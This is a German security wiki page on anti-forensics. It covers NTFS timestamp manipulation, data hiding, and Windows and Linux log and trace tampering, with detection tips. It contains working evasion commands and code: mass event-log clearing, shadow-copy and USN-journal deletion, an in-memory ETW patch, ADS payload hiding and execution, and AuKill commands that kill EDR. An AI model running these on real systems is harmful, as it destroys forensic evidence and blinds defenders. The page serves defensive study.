# Anti-Forensische Techniken

{{#include ../../banners/hacktricks-training.md}}

## Zeitstempel

Ein Angreifer könnte daran interessiert sein, **die Zeitstempel von Dateien zu ändern**, um nicht entdeckt zu werden.\
Es ist möglich, die Zeitstempel im MFT in den Attributen `$STANDARD_INFORMATION` \_\_ und \_\_ `$FILE_NAME` zu finden.

Beide Attribute haben 4 Zeitstempel: **Änderung**, **Zugriff**, **Erstellung** und **MFT-Registrierungsänderung** (MACE oder MACB).

**Windows Explorer** und andere Tools zeigen die Informationen aus **`$STANDARD_INFORMATION`** an.

### TimeStomp - Anti-forensisches Tool

Dieses Tool **modifiziert** die Zeitstempelinformationen innerhalb von **`$STANDARD_INFORMATION`**, **aber** **nicht** die Informationen innerhalb von **`$FILE_NAME`**. Daher ist es möglich, **verdächtige** **Aktivitäten** zu **identifizieren**.

### Usnjrnl

Das **USN Journal** (Update Sequence Number Journal) ist eine Funktion des NTFS (Windows NT-Dateisystem), die Änderungen am Volume verfolgt. Das [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) Tool ermöglicht die Untersuchung dieser Änderungen.

![](<../../images/image (801).png>)

Das vorherige Bild ist die **Ausgabe**, die von dem **Tool** angezeigt wird, wo zu beobachten ist, dass einige **Änderungen vorgenommen wurden**.

### $LogFile

**Alle Metadatenänderungen an einem Dateisystem werden** in einem Prozess protokolliert, der als [Write-Ahead Logging](https://en.wikipedia.org/wiki/Write-ahead_logging) bekannt ist. Die protokollierten Metadaten werden in einer Datei namens `**$LogFile**` gespeichert, die sich im Stammverzeichnis eines NTFS-Dateisystems befindet. Tools wie [LogFileParser](https://github.com/jschicht/LogFileParser) können verwendet werden, um diese Datei zu analysieren und Änderungen zu identifizieren.

![](<../../images/image (137).png>)

Wiederum ist in der Ausgabe des Tools zu sehen, dass **einige Änderungen vorgenommen wurden**.

Mit demselben Tool ist es möglich zu identifizieren, **zu welchem Zeitpunkt die Zeitstempel geändert wurden**:

![](<../../images/image (1089).png>)

- CTIME: Erstellungszeit der Datei
- ATIME: Änderungszeit der Datei
- MTIME: MFT-Registrierungsänderung der Datei
- RTIME: Zugriffszeit der Datei

### Vergleich von `$STANDARD_INFORMATION` und `$FILE_NAME`

Eine weitere Möglichkeit, verdächtig modifizierte Dateien zu identifizieren, wäre der Vergleich der Zeit in beiden Attributen auf **Unstimmigkeiten** zu überprüfen.

### Nanosekunden

**NTFS**-Zeitstempel haben eine **Präzision** von **100 Nanosekunden**. Daher ist es sehr **verdächtig**, Dateien mit Zeitstempeln wie 2010-10-10 10:10:**00.000:0000 zu finden.

### SetMace - Anti-forensisches Tool

Dieses Tool kann beide Attribute `$STANDARD_INFORMATION` und `$FILE_NAME` modifizieren. Allerdings ist es seit Windows Vista notwendig, dass ein aktives Betriebssystem diese Informationen ändert.

## Datenversteckung

NFTS verwendet einen Cluster und die minimale Informationsgröße. Das bedeutet, dass, wenn eine Datei einen Cluster und einen halben Cluster belegt, der **verbleibende halbe Cluster niemals verwendet wird**, bis die Datei gelöscht wird. Dann ist es möglich, **Daten in diesem Slack-Space zu verstecken**.

Es gibt Tools wie Slacker, die es ermöglichen, Daten in diesem "versteckten" Raum zu verbergen. Eine Analyse des `$logfile` und `$usnjrnl` kann jedoch zeigen, dass einige Daten hinzugefügt wurden:

![](<../../images/image (1060).png>)

Dann ist es möglich, den Slack-Space mit Tools wie FTK Imager wiederherzustellen. Beachten Sie, dass diese Art von Tool den Inhalt obfuskiert oder sogar verschlüsselt speichern kann.

## UsbKill

Dies ist ein Tool, das den Computer **ausschaltet, wenn eine Änderung an den USB**-Ports erkannt wird.\
Eine Möglichkeit, dies zu entdecken, wäre, die laufenden Prozesse zu inspizieren und **jedes laufende Python-Skript zu überprüfen**.

## Live Linux-Distributionen

Diese Distributionen werden **im RAM** ausgeführt. Die einzige Möglichkeit, sie zu erkennen, besteht darin, **wenn das NTFS-Dateisystem mit Schreibberechtigungen gemountet ist**. Wenn es nur mit Lesezugriff gemountet ist, wird es nicht möglich sein, die Eindringung zu erkennen.

## Sichere Löschung

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows-Konfiguration

Es ist möglich, mehrere Windows-Protokollierungsmethoden zu deaktivieren, um die forensische Untersuchung erheblich zu erschweren.

### Zeitstempel deaktivieren - UserAssist

Dies ist ein Registrierungsschlüssel, der Daten und Uhrzeiten speichert, wann jede ausführbare Datei vom Benutzer ausgeführt wurde.

Das Deaktivieren von UserAssist erfordert zwei Schritte:

1. Setzen Sie zwei Registrierungsschlüssel, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` und `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, beide auf null, um anzuzeigen, dass wir UserAssist deaktivieren möchten.
2. Löschen Sie Ihre Registrierungssubtrees, die wie `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` aussehen.

### Zeitstempel deaktivieren - Prefetch

Dies speichert Informationen über die ausgeführten Anwendungen mit dem Ziel, die Leistung des Windows-Systems zu verbessern. Dies kann jedoch auch für forensische Praktiken nützlich sein.

- Führen Sie `regedit` aus
- Wählen Sie den Dateipfad `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Klicken Sie mit der rechten Maustaste auf `EnablePrefetcher` und `EnableSuperfetch`
- Wählen Sie Ändern für jeden dieser Werte, um den Wert von 1 (oder 3) auf 0 zu ändern
- Neustart

### Zeitstempel deaktivieren - Letzter Zugriffszeit

Immer wenn ein Ordner von einem NTFS-Volume auf einem Windows NT-Server geöffnet wird, nimmt das System sich die Zeit, um **ein Zeitstempelfeld für jeden aufgelisteten Ordner zu aktualisieren**, das als letzte Zugriffszeit bezeichnet wird. Bei einem stark genutzten NTFS-Volume kann dies die Leistung beeinträchtigen.

1. Öffnen Sie den Registrierungs-Editor (Regedit.exe).
2. Navigieren Sie zu `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Suchen Sie nach `NtfsDisableLastAccessUpdate`. Wenn es nicht existiert, fügen Sie dieses DWORD hinzu und setzen Sie seinen Wert auf 1, um den Prozess zu deaktivieren.
4. Schließen Sie den Registrierungs-Editor und starten Sie den Server neu.

### USB-Historie löschen

Alle **USB-Geräteeinträge** werden in der Windows-Registrierung unter dem **USBSTOR**-Registrierungsschlüssel gespeichert, der Unterschlüssel enthält, die erstellt werden, wenn Sie ein USB-Gerät an Ihren PC oder Laptop anschließen. Sie finden diesen Schlüssel hier `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Durch das Löschen dieses Schlüssels** löschen Sie die USB-Historie.\
Sie können auch das Tool [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) verwenden, um sicherzustellen, dass Sie sie gelöscht haben (und um sie zu löschen).

Eine weitere Datei, die Informationen über die USBs speichert, ist die Datei `setupapi.dev.log` im Verzeichnis `C:\Windows\INF`. Diese sollte ebenfalls gelöscht werden.

### Schattenkopien deaktivieren

**Listen** Sie Schattenkopien mit `vssadmin list shadowstorage`\
**Löschen** Sie sie, indem Sie `vssadmin delete shadow` ausführen.

Sie können sie auch über die GUI löschen, indem Sie die Schritte in [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) befolgen.

Um Schattenkopien zu deaktivieren, [folgen Sie diesen Schritten](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Öffnen Sie das Programm Dienste, indem Sie "Dienste" in das Textsuchfeld eingeben, nachdem Sie auf die Windows-Starttaste geklickt haben.
2. Suchen Sie in der Liste nach "Volume Shadow Copy", wählen Sie es aus und greifen Sie dann mit einem Rechtsklick auf die Eigenschaften zu.
3. Wählen Sie Deaktiviert aus dem Dropdown-Menü "Starttyp" und bestätigen Sie die Änderung, indem Sie auf Übernehmen und OK klicken.

Es ist auch möglich, die Konfiguration zu ändern, welche Dateien in der Schattenkopie kopiert werden sollen, in der Registrierung `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`.

### Gelöschte Dateien überschreiben

- Sie können ein **Windows-Tool** verwenden: `cipher /w:C`. Dies weist Cipher an, alle Daten aus dem verfügbaren ungenutzten Speicherplatz auf dem C-Laufwerk zu entfernen.
- Sie können auch Tools wie [**Eraser**](https://eraser.heidi.ie) verwenden.

### Windows-Ereignisprotokolle löschen

- Windows + R --> eventvwr.msc --> Erweitern Sie "Windows-Protokolle" --> Klicken Sie mit der rechten Maustaste auf jede Kategorie und wählen Sie "Protokoll löschen"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Windows-Ereignisprotokolle deaktivieren

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Deaktivieren Sie im Abschnitt Dienste den Dienst "Windows-Ereignisprotokoll"
- `WEvtUtil.exec clear-log` oder `WEvtUtil.exe cl`

### $UsnJrnl deaktivieren

- `fsutil usn deletejournal /d c:`

---

## Fortgeschrittene Protokollierung & Trace-Manipulation (2023-2025)

### PowerShell ScriptBlock/Modul-Protokollierung

Neuere Versionen von Windows 10/11 und Windows Server speichern **reiche PowerShell-forensische Artefakte** unter
`Microsoft-Windows-PowerShell/Operational` (Ereignisse 4104/4105/4106).
Angreifer können sie im laufenden Betrieb deaktivieren oder löschen:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Verteidiger sollten Änderungen an diesen Registrierungsschlüsseln und eine hohe Anzahl von Löschungen von PowerShell-Ereignissen überwachen.

### ETW (Event Tracing for Windows) Patch

Endpoint-Sicherheitsprodukte verlassen sich stark auf ETW. Eine beliebte Umgehungsmethode im Jahr 2024 besteht darin, `ntdll!EtwEventWrite`/`EtwEventWriteFull` im Speicher zu patchen, sodass jeder ETW-Aufruf `STATUS_SUCCESS` zurückgibt, ohne das Ereignis auszugeben:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Öffentliche PoCs (z.B. `EtwTiSwallow`) implementieren dasselbe Primitive in PowerShell oder C++. 
Da der Patch **prozesslokal** ist, können EDRs, die in anderen Prozessen laufen, ihn möglicherweise übersehen. 
Erkennung: Vergleiche `ntdll` im Speicher mit dem auf der Festplatte oder hooke vor dem Benutzermodus.

### Wiederbelebung von Alternativen Datenströmen (ADS)

Malware-Kampagnen im Jahr 2023 (z.B. **FIN12** Loader) wurden beobachtet, wie sie zweite Stufen-Binärdateien 
innerhalb von ADS platzieren, um sich vor traditionellen Scannern zu verstecken:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumerieren Sie Streams mit `dir /R`, `Get-Item -Stream *` oder Sysinternals `streams64.exe`. Das Kopieren der Host-Datei auf FAT/exFAT oder über SMB entfernt den versteckten Stream und kann von Ermittlern verwendet werden, um die Nutzlast wiederherzustellen.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver wird jetzt routinemäßig für **Anti-Forensik** bei Ransomware-Einbrüchen verwendet. Das Open-Source-Tool **AuKill** lädt einen signierten, aber anfälligen Treiber (`procexp152.sys`), um EDR- und forensische Sensoren **vor der Verschlüsselung & Protokolldestruktion** auszusetzen oder zu beenden:
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Der Treiber wird anschließend entfernt, wodurch minimale Artefakte hinterlassen werden.  
Minderungen: Aktivieren Sie die Microsoft-Blockliste für anfällige Treiber (HVCI/SAC) und alarmieren Sie bei der Erstellung von Kernel-Diensten aus benutzerschreibbaren Pfaden.

---

## Linux Anti-Forensik: Selbstpatching und Cloud C2 (2023–2025)

### Selbstpatching kompromittierter Dienste zur Reduzierung der Erkennung (Linux)  
Gegner "selbstpatchen" zunehmend einen Dienst direkt nach der Ausnutzung, um sowohl eine erneute Ausnutzung zu verhindern als auch erkenntnisbasierte Erkennungen zu unterdrücken. Die Idee ist, anfällige Komponenten durch die neuesten legitimen Upstream-Binärdateien/JARs zu ersetzen, sodass Scanner den Host als gepatcht melden, während Persistenz und C2 bestehen bleiben.

Beispiel: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
- Nach der Ausnutzung holten sich die Angreifer legitime JARs von Maven Central (repo1.maven.org), löschten anfällige JARs in der ActiveMQ-Installation und starteten den Broker neu.  
- Dies schloss die ursprüngliche RCE, während andere Fußabdrücke (cron, SSH-Konfigurationsänderungen, separate C2-Implantate) erhalten blieben.

Betriebliche Beispiel (veranschaulichend)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensische/Jagd Tipps
- Überprüfen Sie Servicedirektoren auf nicht geplante binäre/JAR-Ersetzungen:
- Debian/Ubuntu: `dpkg -V activemq` und vergleichen Sie Dateihashes/Pfade mit Repo-Spiegeln.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Suchen Sie nach JAR-Versionen, die auf der Festplatte vorhanden sind und nicht vom Paketmanager verwaltet werden, oder nach symbolischen Links, die außerhalb des Bandes aktualisiert wurden.
- Zeitachse: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` um ctime/mtime mit dem Kompromissfenster zu korrelieren.
- Shell-Historie/Prozess-Telemetrie: Beweise für `curl`/`wget` zu `repo1.maven.org` oder anderen Artefakt-CDNs unmittelbar nach der ersten Ausnutzung.
- Änderungsmanagement: Validieren Sie, wer den „Patch“ angewendet hat und warum, nicht nur, dass eine gepatchte Version vorhanden ist.

### Cloud-Service C2 mit Träger-Token und Anti-Analyse-Stager
Beobachtete Handwerkskunst kombinierte mehrere langfristige C2-Pfade und Anti-Analyse-Pakete:
- Passwortgeschützte PyInstaller ELF-Loader, um Sandboxing und statische Analyse zu behindern (z. B. verschlüsseltes PYZ, temporäre Extraktion unter `/_MEI*`).
- Indikatoren: `strings` Treffer wie `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Laufzeitartefakte: Extraktion nach `/tmp/_MEI*` oder benutzerdefinierte `--runtime-tmpdir` Pfade.
- Dropbox-unterstütztes C2 mit fest codierten OAuth-Bearer-Token
- Netzwerkmarker: `api.dropboxapi.com` / `content.dropboxapi.com` mit `Authorization: Bearer <token>`.
- Suchen Sie in Proxy/NetFlow/Zeek/Suricata nach ausgehenden HTTPS zu Dropbox-Domains von Server-Workloads, die normalerweise keine Dateien synchronisieren.
- Parallel/Backup C2 über Tunneling (z. B. Cloudflare Tunnel `cloudflared`), Kontrolle behalten, wenn ein Kanal blockiert ist.
- Host IOCs: `cloudflared` Prozesse/Einheiten, Konfiguration unter `~/.cloudflared/*.json`, ausgehendes 443 zu Cloudflare-Edges.

### Persistenz und „Hardening-Rollback“, um den Zugriff aufrechtzuerhalten (Linux-Beispiele)
Angreifer kombinieren häufig Selbstpatching mit dauerhaften Zugangswegen:
- Cron/Anacron: Änderungen am `0anacron` Stub in jedem `/etc/cron.*/` Verzeichnis für die periodische Ausführung.
- Suchen:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH-Konfigurations-Hardening-Rollback: Aktivierung von Root-Logins und Änderung der Standard-Shells für niedrigprivilegierte Konten.
- Suchen Sie nach der Aktivierung von Root-Logins:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# Flag-Werte wie "yes" oder zu großzügige Einstellungen
```
- Suchen Sie nach verdächtigen interaktiven Shells auf Systemkonten (z. B. `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Zufällige, kurz benannte Beacon-Artefakte (8 alphabetische Zeichen), die auf die Festplatte geschrieben werden und ebenfalls Cloud C2 kontaktieren:
- Suchen:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Verteidiger sollten diese Artefakte mit externen Expositionen und Service-Patching-Ereignissen korrelieren, um anti-forensische Selbstbehebungen aufzudecken, die verwendet werden, um die ursprüngliche Ausnutzung zu verbergen.

## Referenzen

- Sophos X-Ops – “AuKill: Ein bewaffneter verwundbarer Treiber zur Deaktivierung von EDR” (März 2023)
https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
- Red Canary – “Patching EtwEventWrite für Stealth: Erkennung & Jagd” (Juni 2024)
https://redcanary.com/blog/etw-patching-detection

- [Red Canary – Patching für Persistenz: Wie DripDropper Linux-Malware durch die Cloud bewegt](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
